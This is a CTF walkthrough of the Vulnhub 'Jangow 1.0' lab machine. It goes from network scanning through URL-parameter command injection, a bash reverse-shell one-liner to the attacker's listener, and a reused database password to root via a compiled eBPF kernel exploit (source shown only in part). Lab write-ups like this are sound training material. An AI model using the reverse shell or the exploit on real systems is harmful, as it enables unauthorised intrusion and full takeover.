---
title: Jangow 1.0 (Vulnhub Writeup)
date: 2023-05-17
categories: [Writeups, Vulnhub]
tags: [Linux, RCE, Easy, Polkit exploit]
---

![](/assets/img/jangow/6.jpg)

Hi guys!! How are you doing? Today, we are going to be solving the `Jangow` machine, this time from the platform `Vulnhub`! This an easy and linux machine, but even that, it is pretty cool.
If you have everything ready, let's start!

## Enumeration

- - -

Because this is a `Vulnhub` machine and is on our local network, before we start enumerating, we have to find the machine's IP address:

```zsh
❯ arp-scan -I wlan0 --ignoredups --localnet
Interface: wlan0, type: EN10MB, MAC: 3c:a0:67:42:9b:ce, IPv4: 192.168.0.106
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	ac:84:c6:d2:37:b2	TP-LINK TECHNOLOGIES CO.,LTD.
192.168.0.10	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.104	d0:bf:9c:1a:e1:64	Hewlett Packard
192.168.0.110	08:00:27:5c:be:40	PCS Systemtechnik GmbH
192.168.0.109	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.113	68:f7:28:2a:26:fd	LCFC(HeFei) Electronics Technology co., ltd
192.168.0.101	7c:2f:80:ed:0c:de	Gigaset Communications GmbH
```

Because I use VirtualBox to host the vulnerable machine, I know that the IP is the one that the vendor is `PCS Systemtechnik GmbH`, so before we start enumerating, we will need to know which OS is running on the vulnerable machine. To know that, we will do a `ping` to the machine to know the `ttl`. If the `ttl` is under 64, it means that the OS is Linux. If the `ttl` is about 128, it means that the OS is Windows.

```zsh
❯ ping -c 1 192.168.0.110
PING 192.168.0.110 (192.168.0.110) 56(84) bytes of data.
64 bytes from 192.168.0.110: icmp_seq=1 ttl=64 time=1.14 ms

--- 192.168.0.110 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.144/1.144/1.144/0.000 ms
```

In this case we can see that the `ttl` is 64, so the machine is Linux.
Now, we can start enumerating the opened ports with `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.110 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 16:24 CEST
Initiating ARP Ping Scan at 16:24
Scanning 192.168.0.110 [1 port]
Completed ARP Ping Scan at 16:24, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:24
Scanning 192.168.0.110 [65535 ports]
Discovered open port 21/tcp on 192.168.0.110
Discovered open port 80/tcp on 192.168.0.110
Completed SYN Stealth Scan at 16:25, 26.37s elapsed (65535 total ports)
Nmap scan report for 192.168.0.110
Host is up, received arp-response (0.00053s latency).
Scanned at 2023-05-17 16:24:43 CEST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:5C:BE:40 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
           Raw packets sent: 131090 (5.768MB) | Rcvd: 24 (1.040KB)
```

Great, now that we have the opened ports, let's perform a deeper scan to them. To have everything more organized, we will extract the ports of the `allPorts` file with a custom function called `extractPorts`:

```zsh
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

We will input `extractPorts` and then the file name:

```zsh
❯ extractPorts allPorts

[*] Extracting information...

    [*] IP Address: 192.168.0.110
    [*] Open ports: 21,80

[*] Ports copied to clipboard
```

Now, we will perform a deeper scan:

```zsh
❯ nmap -sCV -p21,80 192.168.0.110 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 16:29 CEST
Nmap scan report for 192.168.0.110
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
MAC Address: 08:00:27:5C:BE:40 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

Nice! Now we can see all the versions of the servicies on every single port. We can see that port `21` is open, so an `ftp` service is running. We can also see that port `80` is open, so a web service may run on that port.
Now, we can access the web too see what is in it. We could also perform a `whatweb` scan:

```zsh
❯ whatweb http://192.168.0.110
http://192.168.0.110 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.0.110], Index-Of, Title[Index of /]
```

## Gaining access (www-data)

- - -

This don't give us anything useful, so let's access the web:

![](/assets/img/jangow/1.png)

Ok, so we can see a `site` directory, so let's access it and see it's content:

![](/assets/img/jangow/2.png)

Nice, so it looks that is a well-setted up web, but it only looks. If we click on the `Buscar` button we can notice some suspicious behavior on the url:

![](/assets/img/jangow/3.png)

We can see that is expeting our input after the `=`, so here we could try a `RCE` and we can see that it will work as expected:

![](/assets/img/jangow/4.png)

Ok, so we have a very easy way to get `RCE`, so let's gain access to the machine. For that, we will start our `netcat` listener

![](/assets/img/jangow/meme.png)

I was just kidding, let's start our `netcat` listener on port 443:

```zsh
❯ nc -lvnp 443
listening on [any] 443 ...
```

And with the `RCE`, we will send us a `reverse shell`. We will use the tipical `oneliner`:

```bash
bash -c "bash -i >& /dev/tcp/192.168.0.106/443 0>&1"
```

But to get this working, we will need to `urlencode` this payload. To do this, we will replace the `>&` for `>%26`. Our url should look like this:

![](/assets/img/jangow/5.png)

Now, hit `ENTER` and the web will get loading, but if you check your `netcat` listener, you should get a shell:

```zsh
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.110] 49398
bash: cannot set terminal process group (2786): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jangow01:/var/www/html/site$ 
```

Perfect!!! We have a shell as `www-data`. Now, we have to check how we can pivot to the user `jangow01` we can see doing an `ls /home` command:

```bash
www-data@jangow01:/var/www/html/site$ ls /home
jangow01
www-data@jangow01:/var/www/html/site$
```
## Lateral movement 

- - -

To get on the machine as the user `jangow01`, it's as simple as do a `cat` to an specific file. Just moving a directory back, we can notice about a `.backup` file. If we watch the content of this file, we can see the `jangow01`'s password:

```bash
www-data@jangow01:/var/www/html/site$ cd ..
www-data@jangow01:/var/www/html$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Oct 31  2021 .
drwxr-xr-x 3 root     root     4096 Oct 31  2021 ..
-rw-r--r-- 1 www-data www-data  336 Oct 31  2021 .backup
drwxr-xr-x 6 www-data www-data 4096 Jun 10  2021 site
www-data@jangow01:/var/www/html$ cat .backup
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
www-data@jangow01:/var/www/html$ 
```

Nice! Now we can switch to the user by using the `su` command:

```bash
www-data@jangow01:/var/www/html$ su jangow01
Password: 
jangow01@jangow01:/var/www/html$ 
```

Perfect!! We are user `jangow01`. We can see the user flag at the `/home/jangow01` directory:

```bash
jangow01@jangow01:/var/www/html$ cd
jangow01@jangow01:~$ ls
user.txt
jangow01@jangow01:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
jangow01@jangow01:~$ 
```

## Privilege escalation

- - -

If we do a `sudo -l` command to see what commands we can run as `root` user, we will get an error message that says that we are not allowed to run commands as root on this machine. For some reason, this machine is in Portuguese xD.

```bash
jangow01@jangow01:~$ sudo -l
sudo: não foi possível resolver máquina jangow01: Conexão recusada
[sudo] senha para jangow01: 
Sinto muito, usuário jangow01 não pode executar sudo em jangow01.
jangow01@jangow01:~$ 
```

To see other ways to privilege escalate, we can list `SUID` binaries:

```bash
jangow01@jangow01:~$ cd /
jangow01@jangow01:/$ find / \-perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/ubuntu-core-launcher
/usr/bin/sudo
/usr/bin/gpasswd
/bin/fusermount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/umount
/bin/ping6
/bin/mount
jangow01@jangow01:/$ 
```

All right, this is a veeeeery easy to privilege escalate. As we can see, the `pkexec` binary is with permissions `SUID`, so if we run an `lsb_release -a` command, we can see that the kernel version is pretty old. 

```bash
jangow01@jangow01:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.1 LTS
Release:	16.04
Codename:	xenial
jangow01@jangow01:/$ 
```

I say that is a very easy because there is a bunch of exploits of this vulnerability [here](https://www.exploit-db.com/exploits/45010).
Let's save this code in a file with extension `.c` into the machine:

```bash
jangow01@jangow01:~$ nano exploit.c
jangow01@jangow01:~$ cat exploit.c
/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
  
  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   
  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
```
***truncated***

Now, we will compile the file so it will become an executable binary:

```bash
jangow01@jangow01:~$ gcc exploit.c -o exploit
jangow01@jangow01:~$ ./exploit
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800398c9d00
[*] Leaking sock struct from ffff88003c89f2c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003cd5e480
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003cd5e480
[*] credentials patched, launching shell...
# whoami
root
# 
```

Perfect!! Rooted machine!! 

## Conclusions

- - -

This was a very simple machine, but the privilege escalation was very cool. I hope, as always, that you have learned something.
As always, it's me, Ruycr4ft. Take care!
